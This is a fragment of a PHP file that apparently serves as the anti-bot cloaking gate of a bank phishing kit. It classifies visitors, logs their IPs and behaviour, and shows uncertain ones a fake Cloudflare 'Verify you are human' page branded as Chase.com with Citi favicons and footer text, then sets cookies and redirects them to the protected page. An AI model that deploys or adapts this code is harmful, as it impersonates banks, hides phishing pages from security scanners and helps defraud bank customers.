        log_access_attempt($client_ip, 'human', $bot_analysis['confidence'], $bot_analysis, $characteristics);
        // Allow the page to continue loading - no exit, no redirect
    }
    
    // Show warning UI only for uncertain cases
    if ($bot_analysis['is_uncertain']) {
        // Generate dynamic fingerprint for this session
        $dynamic_fp = generate_dynamic_fingerprint($client_ip);
        save_fingerprint($client_ip, $dynamic_fp);
        
        // Log to admin dashboard
        log_access_attempt($client_ip, 'uncertain', $bot_analysis['confidence'], $bot_analysis, $characteristics);
        // Show CAPTCHA page
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <title id="dynamic-title">Verify you are human</title>
          <meta name="viewport" content="width=device-width, initial-scale=1" />
          <link rel="icon" href="https://www.citi.com/favicon.ico" sizes="any">
          <link rel="icon" type="image/svg+xml" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
          <style>
            :root {
              --box-border:#e5e7eb;
              --box-bg:#fff;
              --text:#222;
              --muted:#8b8b8b;
              --check:#198754;
              --check-bg:#eaf7ed;
              --shadow:0 1px 6px rgba(0,0,0,.06);
            }

            html, body {
              margin: 0;
              padding: 0;
              height: 100%;
              background: #fff;
              font-family: "Segoe UI","Tahoma","Arial",sans-serif;
              color: var(--text);
              display: flex;
              justify-content: flex-start;
              align-items: flex-start;
            }

            .wrap {
              margin: 90px 0 0 48px;
              display: flex;
              flex-direction: column;
              align-items: flex-start;
              max-width: 640px;
              width: 100%;
              box-sizing: border-box;
            }

            .head {
              display: flex;
              align-items: center;
              gap: 8px;
              margin-bottom: 6px;
            }

            .site-logo { height: 26px; width: auto; object-fit: contain; }
            .site-title { font-size: 1.8rem; font-weight: 700; margin: 0; }
            .desc { font-size: 1rem; margin: 0 0 16px 0; }

            .cf-box {
              position: relative;
              background: var(--box-bg);
              border: 1px solid var(--box-border);
              border-radius: 6px;
              box-shadow: var(--shadow);
              width: 100%;
              max-width: 560px;
              padding: 10px 14px;
              display: flex;
              align-items: center;
              justify-content: space-between;
              gap: 8px;
              box-sizing: border-box;
              overflow: hidden;
            }

            .cf-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 0; }
            .cf-checkbox {
              appearance: none;
              width: 24px; height: 24px;
              border: 2px solid #bfbfbf; border-radius: 6px;
              background: #f9f9f9; cursor: pointer;
              position: relative; outline: none;
              transition: border-color .18s, background .18s;
              flex: 0 0 24px;
            }
            .cf-checkbox:checked { border-color: var(--check); background: var(--check-bg); }
            .cf-checkbox:checked::after {
              content: "";
              position: absolute;
              left: 6px; top: 3px;
              width: 8px; height: 14px;
              border: solid var(--check);
              border-width: 0 3px 3px 0;
              transform: rotate(45deg);
            }

            .cf-text { font-size: .98rem; user-select: none; }
            .cf-right { display: flex; flex-direction: column; align-items: flex-end; min-width: 70px; }
            .cf-logo { height: 22px; object-fit: contain; margin-bottom: 4px; }
            .cf-legal { font-size: .88rem; color: var(--muted); }

            .state-overlay {
              position: absolute;
              inset: 0;
              background: #fff;
              display: none;
              align-items: center;
              gap: 10px;
              padding: 0 14px;
              font-size: .98rem;
              font-weight: 600;
            }

            .state-overlay.active { display: flex; animation: fade .2s; }
            .spinner {
              width: 18px; height: 18px;
              display: inline-block; position: relative;
            }
            .spinner::before {
              content: "";
              position: absolute; inset: 0;
              border-radius: 50%;
              border: 3px dotted #4a9cdb;
              animation: spin 1s linear infinite;
            }

            .success-icon {
              width: 22px; height: 22px;
              border-radius: 50%;
              background: #34c759; color: #fff;
              display: inline-flex; align-items: center;
              justify-content: center; font-size: 14px;
            }

            .foot { margin-top: 14px; font-size: .98rem; }

            @keyframes spin { to { transform: rotate(360deg); } }
            @keyframes fade { from { opacity: 0; } to { opacity: 1; } }

            @media (max-width: 600px) {
              .wrap {
                margin: 110px 0 0 16px;
                max-width: 100%;
                width: calc(100vw - 32px);
              }
              .site-title { font-size: 1.25rem; }
              .desc { font-size: .95rem; margin-bottom: 12px; }
              .cf-box {
                max-width: none;
                width: 100%;
                padding: 8px 12px;
              }
              .cf-text { font-size: .94rem; }
              .cf-right { min-width: auto; }
              .cf-logo { height: 20px; }
              .foot { font-size: .9rem; }
            }
          </style>
        </head>
        <body>
          <div class="wrap">
            <div class="head">
              <img id="site-logo" class="site-logo" src="https://www.chase.com/etc/designs/chase-ux/favicon.ico" alt="">
              <h1 id="site-title" class="site-title">Chase.com</h1>
            </div>
            <p class="desc">Verify you are human by completing the action below.</p>

            <form id="cfForm" class="cf-box" autocomplete="off" onsubmit="return false">
              <label class="cf-left" for="cfCheck">
                <input id="cfCheck" type="checkbox" class="cf-checkbox" aria-label="Verify you are human">
                <span class="cf-text">Verify you are human</span>
              </label>
              <div class="cf-right" aria-hidden="true">
                <img class="cf-logo" src="https://api.imghippo.com/files/oh3020lFQ.png" alt="CLOUDFLARE">
                <div class="cf-legal">Privacy &nbsp;•&nbsp; Terms</div>
              </div>

              <div id="stateVerifying" class="state-overlay" aria-live="polite">
                <span class="spinner" aria-hidden="true"></span>
                <span>Verifying...</span>
              </div>

              <div id="stateSuccess" class="state-overlay" aria-live="polite">
                <span class="success-icon">✔</span>
                <span>Success!</span>
              </div>
            </form>

            <p id="site-foot" class="foot">citi.com needs to review the security of your connection before proceeding.</p>
          </div>

          <script>
            function setSite(name, logoUrl) {
              document.getElementById('site-title').textContent = name;
              document.getElementById('site-foot').textContent =
                name + " needs to review the security of your connection before proceeding.";
              document.getElementById('dynamic-title').textContent = name + " | Verify you are human";
              if (logoUrl) document.getElementById('site-logo').src = logoUrl;
            }

            setSite("Chase.com", "https://www.chase.com/etc/designs/chase-ux/favicon.ico");

            // Behavioral tracking for anti-bot detection
            const behaviorData = {
              clicks: [],
              mouseMovements: [],
              keyPresses: [],
              startTime: Date.now(),
              errors: 0,
              hesitations: 0
            };

            // Track mouse movements for natural behavior
            let lastMouseMove = Date.now();
            document.addEventListener('mousemove', (e) => {
              const now = Date.now();
              const timeSinceLastMove = now - lastMouseMove;
              behaviorData.mouseMovements.push({
                x: e.clientX,
                y: e.clientY,
                time: now,
                gap: timeSinceLastMove
              });
              lastMouseMove = now;
              
              if (behaviorData.mouseMovements.length > 50) {
                behaviorData.mouseMovements.shift();
              }
            });

            // Track clicks with timing
            document.addEventListener('click', (e) => {
              behaviorData.clicks.push({
                x: e.clientX,
                y: e.clientY,
                time: Date.now(),
                target: e.target.tagName
              });
            });

            // Track keyboard interactions
            document.addEventListener('keydown', (e) => {
              behaviorData.keyPresses.push({
                key: e.key,
                time: Date.now()
              });
            });

            const check = document.getElementById('cfCheck');
            const vState = document.getElementById('stateVerifying');
            const sState = document.getElementById('stateSuccess');
            const originalUrl = localStorage.getItem('antibot_redirect') || '/';

            check.addEventListener('change', () => {
              if (!check.checked) {
                vState.classList.remove('active');
                sState.classList.remove('active');
                return;
              }
              
              const totalTime = Date.now() - behaviorData.startTime;
              const hasNaturalMovement = behaviorData.mouseMovements.length > 10;
              const hasVariedTiming = behaviorData.mouseMovements.some(m => m.gap > 50);
              const notTooFast = totalTime > 1000;
              
              vState.classList.add('active');
              
              const behaviorScore = {
                totalTime,
                mouseMovements: behaviorData.mouseMovements.length,
                clicks: behaviorData.clicks.length,
                naturalBehavior: hasNaturalMovement && hasVariedTiming && notTooFast
              };
              
              try {
                localStorage.setItem('behavior_check', JSON.stringify(behaviorScore));
              } catch(e) {}
              
              // Use dynamic fingerprint from server
              const dynamicFingerprint = <?php echo json_encode($dynamic_fp); ?>;
              
              document.cookie = "js_verified=yes; path=/";
              document.cookie = "fp_hash=" + dynamicFingerprint + "; path=/";
              document.cookie = "behavior_verified=" + (behaviorScore.naturalBehavior ? "yes" : "uncertain") + "; path=/";
              
              setTimeout(() => {
                vState.classList.remove('active');
                sState.classList.add('active');
                setTimeout(() => { location.href = originalUrl; }, 900);
              }, 800);
            });
          </script>
        </body>
        </html>
        <?php
        exit;
    }
    } // End of bot_analysis check
}

// If we reach here, allow the page to continue loading
// This happens when:
// 1. User already has js_verified and fp_hash cookies (returning visitor)
// 2. User was identified as confident human and cookies were set
// The rest of the protected page will load normally
?>
